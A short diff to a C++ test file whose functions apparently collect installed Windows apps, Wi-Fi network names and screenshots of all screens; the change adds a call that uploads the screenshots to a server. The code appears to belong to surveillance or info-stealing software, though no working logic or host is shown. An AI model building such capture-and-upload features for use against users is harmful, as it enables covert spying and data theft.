@@ -15,6 +15,7 @@ void get_windows_apps_info_TEST() {
 void take_screenshots_TEST() {
     ScreenshotsManager screenshots_manager("./images");
     auto screenshots_filepaths = screenshots_manager.take_screenshots_of_all_screens();
+    screenshots_manager.upload_screenshots_to_server(screenshots_filepaths);
 }
 
 void get_ssids_TEST() {
